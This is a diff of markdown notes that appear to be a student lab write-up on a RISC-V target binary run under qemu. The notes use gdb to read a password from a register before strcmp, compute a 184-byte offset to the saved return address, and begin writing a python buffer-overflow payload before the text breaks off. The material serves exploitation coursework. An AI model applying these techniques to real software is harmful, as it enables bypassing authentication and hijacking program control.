@@ -40,24 +40,29 @@
     in gdb: 
     ```target remote localhost:1234```
             disassemble main
+
             address right before strcmp is 0x1064c
-            so break *0x1064c
+            break *0x1064c
             continue
             info registers a0 a1
             x/s $a1
+
             this gives the password
+
             echo "the_string" > payload.txt
             ./target_abhipsamishra2912 < payload.txt
 
-**commands for 3b:**
-    opened gdb: qemu-riscv64 -g 1234 ./target_abhipsamishra2912
+## **commands for 3b:**
+###   opened gdb: 
+    ```qemu-riscv64 -g 1234 ./target_abhipsamishra2912```
 
-    in another terminal: gdb-multiarch ./target_abhipsamishra2912
+    in another terminal: 
+    gdb-multiarch ./target_abhipsamishra2912
+
     stack allocation is 16
     ra saved at 8
     then again add buffer 176
     so 176 + 8 = 184
-    so we figured 184
 
     python3 -c "
     import struct 
